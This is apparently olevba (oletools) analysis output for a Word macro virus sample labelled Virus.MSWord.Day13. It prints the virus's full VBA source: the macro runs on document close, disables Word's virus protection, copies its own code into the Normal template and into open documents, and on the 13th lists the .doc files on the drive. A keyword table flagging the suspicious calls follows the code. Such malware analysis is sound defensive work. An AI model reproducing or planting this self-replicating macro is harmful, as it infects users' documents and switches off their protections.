olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Day13
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Day13 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit
Private strCode As String
Private Sub Document_Close()
On Error Resume Next
With Options
.SaveNormalPrompt = False
.VirusProtection = False
End With
Dim tdCode As Object
Set tdCode = GetCodeModule(ThisDocument)
With tdCode
strCode = .Lines(1, .CountOfLines)
End With
If ThisDocument = NormalTemplate Then
With ActiveDocument
If .Path <> vbNullString Then
SendCode ActiveDocument
.Save
End If
End With
Else
SendCode NormalTemplate
End If
If Day(Now) = 13 Then
With Application.FileSearch
.NewSearch
.LookIn = Left(NormalTemplate.FullName, 3)
.SearchSubFolders = True
.FileName = "*.doc"
.MatchTextExactly = False
.FileType = msoFileTypeAllFiles
.Execute
Dim i As Integer
For i = 1 To .FoundFiles.Count
MsgBox .FoundFiles(i)
Next i
End With
End If
End Sub
Private Function GetCodeModule(objProject As Object) As Object
Set GetCodeModule = objProject.VBProject.VBComponents(1).CodeModule
End Function
Private Sub SendCode(objProject As Object)
Dim objCode As Object
Set objCode = GetCodeModule(objProject)
With objCode
.DeleteLines 1, .CountOfLines
.InsertLines 1, strCode
End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

